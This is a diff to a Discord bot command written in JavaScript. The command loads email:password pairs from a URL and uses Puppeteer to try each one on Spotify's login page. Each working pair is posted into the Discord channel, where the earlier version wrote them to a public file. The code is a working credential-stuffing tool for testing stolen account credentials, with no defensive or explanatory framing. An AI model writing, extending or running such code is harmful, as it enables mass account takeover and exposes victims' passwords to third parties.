@@ -1,4 +1,5 @@
 const fs = require("fs");
+const { RichEmbed } = require("discord.js");
 const puppeteer = require("puppeteer");
 const fetch = require("node-fetch");
 const {
@@ -10,7 +11,6 @@ const {
 const { prefix } = require("../../config");
 
 const document = {};
-const validCredentials = [];
 
 const puppeteerOptions = {
   args: [
@@ -25,35 +25,22 @@ const puppeteerOptions = {
 
 const getCredentials = url => fetch(url).then(res => res.text());
 
-const saveCredentials = (filename, collections) => {
-  const file = fs.createWriteStream(`${getRootDir()}/public/${filename}`);
-  file.on("error", console.error);
-  collections.forEach(value => file.write(`${value}\n`));
-  file.end();
-};
-
 const checkCredentials = async (
-  { browser, credentials, filename, message },
+  { browser, credentials, message, msg },
   index = 0
 ) => {
-  const URL = "https://accounts.spotify.com/en/login";
-  const email = credentials[index].substring(
-    0,
-    credentials[index].indexOf(":")
-  );
-  const password = credentials[index].substring(
-    credentials[index].indexOf(":") + 1
-  );
-
-  message.edit(
-    `Checking (${index + 1}/${
-      credentials.length
-    }) \`${email}\` | You can check the result at http://${
-      process.env.PROJECT_DOMAIN
-    }/public_file/${filename}`
-  );
+  msg.edit(`Checking... (${index + 1}/${credentials.length})`);
 
   try {
+    const URL = "https://accounts.spotify.com/en/login";
+    const email = credentials[index].substring(
+      0,
+      credentials[index].indexOf(":")
+    );
+    const password = credentials[index].substring(
+      credentials[index].indexOf(":") + 1
+    );
+
     if (index < credentials.length) {
       const page = await browser.newPage();
 
@@ -83,19 +70,22 @@ const checkCredentials = async (
       });
 
       if (isValid) {
-        validCredentials.push(credentials[index]);
+        const embed = new RichEmbed()
+          .setColor(`RANDOM`)
+          .setDescription(`${email}:${password}`);
+
+        message.channel.send(embed);
         await page.waitFor(3000);
       }
 
-      saveCredentials(filename, validCredentials);
       await page.close();
-      checkCredentials({ browser, credentials, filename, message }, index + 1);
+      checkCredentials({ browser, credentials, message, msg }, index + 1);
     }
   } catch (err) {
     await browser.close();
     const newBrowser = await puppeteer.launch(puppeteerOptions);
     checkCredentials(
-      { browser: newBrowser, credentials, filename, message },
+      { browser: newBrowser, credentials, message, msg },
       index + 1
     );
   }
@@ -117,19 +107,13 @@ module.exports = {
 
     const browser = await puppeteer.launch(puppeteerOptions);
 
-    return message.channel
-      .send(
-        `Checking... You can check the result at http://${
-          process.env.PROJECT_DOMAIN
-        }/public_file/${args[1]}`
-      )
-      .then(async msg => {
-        await checkCredentials({
-          browser,
-          credentials,
-          message: msg,
-          filename: args[1]
-        });
+    return message.channel.send("Please wait...").then(async msg => {
+      await checkCredentials({
+        browser,
+        credentials,
+        message,
+        msg
       });
+    });
   }
 };
